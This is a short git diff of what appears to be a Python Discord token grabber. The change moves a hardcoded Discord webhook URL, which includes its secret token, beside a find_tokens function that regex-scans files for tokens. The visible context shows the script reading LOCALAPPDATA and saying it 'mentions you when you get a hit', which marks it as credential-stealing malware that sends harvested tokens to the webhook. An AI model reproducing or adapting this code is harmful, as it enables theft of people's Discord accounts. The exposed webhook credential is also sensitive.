@@ -4,9 +4,6 @@ import json
 
 from urllib.request import Request, urlopen
 
-# your webhook URL
-WEBHOOK_URL = 'https://discord.com/api/webhooks/894631773890297908/QUzGsb_WKxtbDGdfTi2I5MFRK-XGKizy4eFWwpzbIT0jqpA5esb1SCZh9-9kaDHC1V53'
-
 # mentions you when you get a hit
 PING_ME = False
 
@@ -24,6 +21,9 @@ def find_tokens(path):
                 for token in re.findall(regex, line):
                     tokens.append(token)
     return tokens
+
+# your webhook URL
+WEBHOOK_URL = 'https://discord.com/api/webhooks/894631773890297908/QUzGsb_WKxtbDGdfTi2I5MFRK-XGKizy4eFWwpzbIT0jqpA5esb1SCZh9-9kaDHC1V53'
 
 def main():
     local = os.getenv('LOCALAPPDATA')
